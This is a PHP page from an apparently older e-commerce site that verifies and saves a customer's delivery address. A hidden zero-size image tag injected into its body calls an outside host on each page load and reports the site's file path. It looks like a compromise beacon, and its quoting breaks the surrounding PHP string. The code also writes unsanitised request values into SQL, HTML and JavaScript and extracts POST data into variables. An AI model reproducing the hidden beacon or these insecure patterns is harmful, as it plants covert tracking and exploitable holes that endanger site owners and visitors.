<?php
/* Programme : chk_adresse_livaison.php
* 	Description : Vérification de l'adresse de livraison de la commande
*	Auteur : Denis Léveillé 	 			  Date : 2007-10-01
*/
include('lib/config.php');

$_SESSION['redir'] = 'chk_adresse_livraison.php';

// **** Choix de la langue de travail ****
switch( $_SESSION['langue'] ) {
	case "en":	include("clientchampsen.inc");
					break;
	case "sp":	include("clientchampssp.inc");
					break;
	default:		include("clientchampsfr.inc");

} // switch SLangue
	

if( !isset($_SESSION[$_SERVER['SERVER_NAME']]) ){
	echo "<META HTTP-EQUIV=Refresh CONTENT='0; URL=connexion.php'>";
	exit();

}

if( !isset($_SESSION['Service']) ) {
	echo"<META HTTP-EQUIV=Refresh CONTENT='0; URL=accueil.php'>";
	exit();
}

function AfficherErreur($texteMsg)
{ 
		$_SESSION['save_post'] = $_POST;
		echo "<META HTTP-EQUIV=Refresh CONTENT='0; URL=chk_adresse_livraison.php?NewMessage=$texteMsg'>";
//exit();
}


// Es-ce que je me rappel ou je rentre pour la premiere fois ou refreah
if( isset( $_POST['retour'] ) && isset($_POST['Commande']) ) {

	extract($_POST,EXTR_OVERWRITE);
	include( 'clientvalide_dest.inc' );
 

	$_SESSION['destinataire']['livraison_no']				=	$_POST['NoClient'];
	$_SESSION['destinataire']['livraison_nom']			=	$_POST['Nom'];
	$_SESSION['destinataire']['livraison_prenom']		=	$_POST['Prenom'];
	$_SESSION['destinataire']['livraison_contact']		=	$_POST['Contact'];
	$_SESSION['destinataire']['livraison_rue']			=	$_POST['Rue'];
	$_SESSION['destinataire']['livraison_indication']	=	$_POST['Indication'];
	$_SESSION['destinataire']['livraison_quartier']		=	$_POST['Quartier'];
	$_SESSION['destinataire']['livraison_ville']			=	$_POST['Ville'];
	$_SESSION['destinataire']['livraison_province']		=	$_POST['Province'];
	$_SESSION['destinataire']['livraison_pays']			=	$_POST['Pays'];
	$_SESSION['destinataire']['livraison_codepostal']	=	$_POST['CodePostal'];
	$_SESSION['destinataire']['livraison_telephone']	=	$_POST['Telephone'];
	$_SESSION['destinataire']['livraison_courriel']		=	$_POST['Courriel'];
	
	$_SESSION['province'] = get_Livreur($_SESSION['destinataire']['livraison_province']);
	
	if( $_SESSION['destinataire']['livraison_no'] == 0 ) {
		$_SESSION['destinataire']['livraison_no'] = insert_client();
		// **** CONNECTION AU SERVEUR
		if( !($Connection = mysql_connect( $host, $user, $password )) )
				die("Impossible connection serveur. ".mysql_error());  // on met à jour les infos du clients
		if( !($db = mysql_select_db( $database, $Connection )) )
				die("Impossible accès BD. ".mysql_error());  // on met à jour les infos du clients
			
		$sql = "INSERT INTO $database.destinataire ( Envoyeur, Destinataire )";
		$sql .= " VALUES ( '".$_SESSION[$_SERVER['SERVER_NAME']]."', '".$_SESSION['destinataire']['livraison_no']."' )";
		if( !mysql_query($sql, $Connection ) ) 
			die("Impossible d'ajouter les informations du destinataire. ".mysql_error());  // on met à jour les infos du clients
 
	}
	else 
		update_client();		

	if( strlen($_POST['retour']) )	
		echo "<META HTTP-EQUIV=Refresh CONTENT='0; URL=".$_POST['retour'].".php'>";
	else
		echo "<META HTTP-EQUIV=Refresh CONTENT='0; URL=panier_valide.php'>";
// A voir si pas un panier ******************************************
// ******************************************************************	

} // POST
else {

	$monPanier = panierInfos($_SESSION['panier']);
	if(	isset($_SESSION[$_SERVER['SERVER_NAME']]) ){
	
		// Es-ce que le destinataire existe deja - EN REFRESH D'ÉCRAN
		if( isset($_POST['NoClient']) && ($_POST['NoClient'] != '') )
			extract($_POST,EXTR_OVERWRITE);
		else {
			// On n'est pas défini alors
			// Existe-t-il un destinataire pour ce client
			$DestClient = dest_client( $_SESSION[$_SERVER['SERVER_NAME']] );
			// Si le destinataire existe
			if( isset($DestClient['NoClient']) ){
				// extraction des info
				extract( $DestClient, EXTR_OVERWRITE );
				if( !strlen($Pays) )
					$Pays = 'CUBA';
			} // Si le destinataire existe deja
			else {
				// Sinon avon snous sauvez notre tampon précédemment - EN VALIDATION
				if( isset($_SESSION['save_post']) ) {  
					$_POST = $_SESSION['save_post'];
					unset($_SESSION['save_post']);
					extract($_POST,EXTR_OVERWRITE);
				} // Si nou avons sauvé le tampon
				elseif( !isset( $_POST['retour'] ) ) {
					// Il n'existe aucun destinataire pour le client
					$NoClient = $Nom = $Prenom = $Contact = '';
					$Rue = $Indication = $Quartier = $Ville = $Province = ''; 
					$CodePostal = $Telephone = $Courriel = $Identite = $Debit = $Refere = $AncienNo = '';
					$Profession = $Fax = $Cellulaire = $DateRappel = $Naissance = '';
					$Identite = $Debit = '';
					$DateInscrip = date("Y-m-d");
					$MaxCredit = 0;
					$CoteCredit = 'A';
					$Pays = 'CUBA';
					$DevCli="CUC";
					$TPSApp="NON";
					$TVQApp="NON";
					$TypCli = "DESTINATAIRE";
					$Langue="SPANISH";
				}
				else
					extract($_POST,EXTR_OVERWRITE);
			} // Si destinataire existe pas
		}
	
 if( $Quartier != "" ) {
 	$TabVille = array();	   
	$TabProvince = array();
	get_ville_prov($Quartier,$TabVille, $TabProvince);
	if( !count($TabVille) )
		unset($TabVille);
	if( !count($TabProvince) )
		unset($TabProvince);
 }
$TabProv = get_Province();
	 
echo
"<html>
	<head>
		<title>".$txt['TitreWeb']." - ".$param['telephone_client']."</title>
		<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1'>
		<meta name='description' content='".$txt['MetaDescription']."'>
		<meta name='keywords' content='".$txt['MetaKeyword']."'>
		<link href='styles/style.css' rel='stylesheet' type='text/css'>
		<base target='MAIN'>
	</head>
	<script language='JavaScript1.2' src='./extra/javafich/disablekeys.js'></script>
<body><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>
	<form name='AdrLivraison' action='' method='post'>
	<table  bgcolor='#FFFFFF' width='$Large' cellpadding='2' cellspacing='0' align='$Enligne' border='1' >
		<tr>";
	if( isset($_SESSION['Service']) && ( $_SESSION['Service'] == $_SERVICE_ACHAT ) && ($monPanier == false) ) {
	    // HTML pour un panier vide
		echo "
			<td>
				<p align=center><font size +2><b>".$txt['votre_panier_est_vide']."</b></font></p><br>
			</td>
		</tr>
		<tr>";
	}
	elseif( !isset($_SESSION['Totaux']['totalpourbanque']) || !$_SESSION['Totaux']['totalpourbanque'] ) {
	    // HTML 
		echo "
			<td>
				<p align=center><font size +2><b>".$txt['montant_fournit']."</b></font></p><br>
			</td>
		</tr>
		<tr>";
	}
	if( isset($_GET['retour']) && strlen($_GET['retour']) ) {
		echo "
			<td bgcolor='#96B2CB' height='16' width='100%' Valign='top'> 
				<img src='images/panier.gif' width='14' height='13'/> <font color='#FFFFFF' ><b>".$txt['paiement_en_ligne_securise']."</b></font>
			</td>
		</tr>
		<tr>";
	}
?>
			<td align='center' Valign='middle' > 
				<font size='+0' face ='verdana' color='#CF0630'>
<?php
			echo $txt['adresse_livraison']."<font size='+1' >";
			if( isset($_GET['NewMessage']) && strlen($_GET['NewMessage']) ){
				echo "<hr size='5' width='96%'/>";
				echo "***&nbsp;&nbsp;".$_GET['NewMessage']."&nbsp;&nbsp;***<br>\r\n";		
			}	
			if( @$_GET['erreur'] == "1" ) {
				echo "<hr size='5' width='96%'/><br>";
				echo $txt['Tous_champs_oblig']."<br>";
			}
?>
				</font>
			</td>
		</tr>	
<?php include('client_destinataire.inc'); ?>	
		<tr>
			<td align='center'>
	 			<p><br/>
<?php
		if( isset($_GET['retour']) ) {
			echo "<input type='submit' name='Commande' value='".$txt['retour_etape_finale']."'  class='form1'>";
		}
		else
			echo "<input type='submit' name='Commande' value='".$txt['passez_a_letape_suivante']."' class='form1'/>";
?>
			</p>
			<table border="0" cellpadding='0' cellspacing="0" align="center" >
				<tr>
					<td>
						<script src="https://siteseal.thawte.com/cgi/server/thawte_seal_generator.exe"></script>
					</td>
				</tr>
				<tr>
					<td height="0" align="center">
						<a style="color:#AD0034" target="_new"	href="http://www.thawte.com/digital-certificates/">
						<span style="font-family:arial; font-size:8px; color:#AD0034"><?=$txt['Au_Sujet_SSL']?></span>
						</a>
					</td>
				</tr>
			</table>
			<br>
	<?php
	} // Si panier plein
	else {
		echo "
			<td>
				<p align=center><font size +2><b>AUCUN COMPTE DE DEFINI ???</b></font></p><br>";
	}
?>
			</td>
		</tr>
	</table>
	<input type='hidden' name='retour' value='<?=@$_GET['retour']?>' />
	<input type='hidden' name='TelCodR' value='' /> 
	<input type='hidden' name='TelP1' value='' /> 
	<input type='hidden' name='TelP2' value='' /> 
	<input type='hidden' name='NoClient' value='<?=$NoClient?>' />
	<input type='hidden' name='Profession' value="<?=$Profession?>" />
	<input type='hidden' name='Naissance' value="<?=$Naissance?>" >
	<input type="hidden" name="Message" value="<?php echo @$Message ?>" />
	<input type="hidden" name="Refere" value="<?php echo @$Refere ?>"/>
	<input type="hidden" name="AncienNo" value="<?php echo @$AncienNo ?>"/>
	<input type='hidden' name='Identite' value='<?=$Identite?>' />
	<input type='hidden' name='Debit' value='<?=$Debit?>' />
	<input type='hidden' name='DateRappel' value='<?=$DateRappel?>' />
	<input type='hidden' name='DateInscrip' value='<?=$DateInscrip?>' />
	<input type='hidden' name='MaxCredit' value='<?=$MaxCredit?>' />
	<input type='hidden' name='CoteCredit' value='<?=$CoteCredit?>' />
	<input type='hidden' name='DevCli' value='<?=$DevCli?>' />
	<input type='hidden' name='TPSApp' value='<?=$TPSApp?>' />
	<input type='hidden' name='TVQApp' value='<?=$TVQApp?>' />
	<input type='hidden' name='TypCli' value='<?=$TypCli?>' />
	<input type='hidden' name='MaxCredit' value='<?=$MaxCredit?>' />
	<input type='hidden' name='Cellulaire' value="<?=$Cellulaire?>">
	<input type='hidden' name='Fax' value="<?=$Fax?>">
	<input type='hidden' name="Langue" size="1" value="<?=$Langue?>">
	</form>
	
<script language='JavaScript1.2'>

function ResetClient() {
	document.AdrLivraison.Nom.value = "";
	document.AdrLivraison.Prenom.value = "";
	document.AdrLivraison.Contact.value = "";
	document.AdrLivraison.Rue.value = "";
	document.AdrLivraison.Indication.value = "";
	document.AdrLivraison.Quartier.value = "";
	document.AdrLivraison.Ville.value = "";
	document.AdrLivraison.Province.value = "";
	document.AdrLivraison.Pays.value = "";
	document.AdrLivraison.CodePostal.value = "";
	document.AdrLivraison.Identite.value = "";
	document.AdrLivraison.Nom.focus();
} // ResetClient


//Convert the username to uppercase.
function capitalize() {
	document.AdrLivraison.Nom.value = document.AdrLivraison.Nom.value.toUpperCase();
	document.AdrLivraison.Prenom.value = document.AdrLivraison.Prenom.value.toUpperCase();
	document.AdrLivraison.Contact.value = document.AdrLivraison.Contact.value.toUpperCase();
	document.AdrLivraison.Rue.value = document.AdrLivraison.Rue.value.toUpperCase();
	document.AdrLivraison.Indication.value = document.AdrLivraison.Indication.value.toUpperCase();
	document.AdrLivraison.Quartier.value = document.AdrLivraison.Quartier.value.toUpperCase()
	document.AdrLivraison.Ville.value = document.AdrLivraison.Ville.value.toUpperCase();
	document.AdrLivraison.Province.value = document.AdrLivraison.Province.value.toUpperCase();
	document.AdrLivraison.Pays.value = document.AdrLivraison.Pays.value.toUpperCase();
	document.AdrLivraison.CodePostal.value = document.AdrLivraison.CodePostal.value.toUpperCase();
} // capitalize

	

function Rafraichie(){
		window.location.reload();
//	document.AdrLivraison.submit();
}

function CheckVilProv() {
	document.AdrLivraison.Quartier.value = document.AdrLivraison.Quartier.value.toUpperCase()
    document.AdrLivraison.submit();
}

function pageonload() {
//	document.ClientForm.Nom.focus();
	<?php
		if( isset($_GET['NewMessage']) && strlen($_GET['NewMessage']) ) {
			echo "window.alert('".$_GET['NewMessage']."');\r\n";
		}
		
  ?>
	 return;
} // pageonload

</script>

</body>
</html>
<?php
 } // Si PAS POST
?>